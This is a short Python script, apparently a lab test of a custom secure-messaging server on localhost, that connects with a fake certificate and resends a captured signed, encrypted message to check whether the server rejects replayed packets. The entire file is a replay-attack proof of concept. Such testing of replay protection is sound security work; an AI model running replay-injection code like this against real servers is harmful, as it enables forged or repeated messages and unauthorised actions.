#!/usr/bin/env python3
import socket, struct, json, time, base64

HOST="127.0.0.1"; PORT=9443

# Replace these with your REAL (seq=1) values:
seq_old = 1
ts_old  = 1763290131276
ct_old  = "QgiCFJYwZsiCMuGG/k4UC7BTCtNqbyAml5W7mK8ULcE="
sig_old = "XCIsLgstgDKfAClwSyLuEVBCBUwgDP9PoEGlJnaqt/KLNxviBwqXBGDObwt7sHJuFYTNFwQqE7DGe7fvcA2W8ozTzWiIovdc5sgL3GEaQs0UX5Nn0NVqdIjn86lkv7J2eh82a+86nE1ajq1S8TGDvQ3WrwX8VUxMCI1HxbajHE5V+nACAeW8XFhmir5jufUR9UMM+9Wu5dsVqIiYTPzXaulWCSEdp04ciTVNU6Uh+7S5949adprBlX3WIPweYNILv3wW6/rnXgE2JRG5hYW4aGRZshBXq2/sAM/p6u1o5Ue/1rK/MVy6Ds1eAebY6gG9S670hHrMobDFMURFyDrNFA=="

def send_block(conn, data: bytes):
    conn.sendall(struct.pack("!I", len(data)))
    conn.sendall(data)

def recv_block(conn):
    raw = conn.recv(4)
    sz  = struct.unpack("!I", raw)[0]
    return conn.recv(sz)

# Step 1 — Connect & perform handshake (reuse actual client handshake code)
print("[*] Connecting as attacker-client...")
sock = socket.create_connection((HOST, PORT))

# Receive server cert
recv_block(sock)
# Send dummy cert — server will reject, but we only need the socket to stay open long enough
send_block(sock, b"fakecert")
try:
    recv_block(sock)
except:
    pass

print("[*] Connected. Injecting replay packet...")

# Step 2 — Send OLD message on SAME connection
payload = {"type":"msg","seqno":seq_old,"ts":ts_old,"ct":ct_old,"sig":sig_old}
send_block(sock, json.dumps(payload).encode())

print("[*] Replay packet sent. Check server output.")

sock.close()
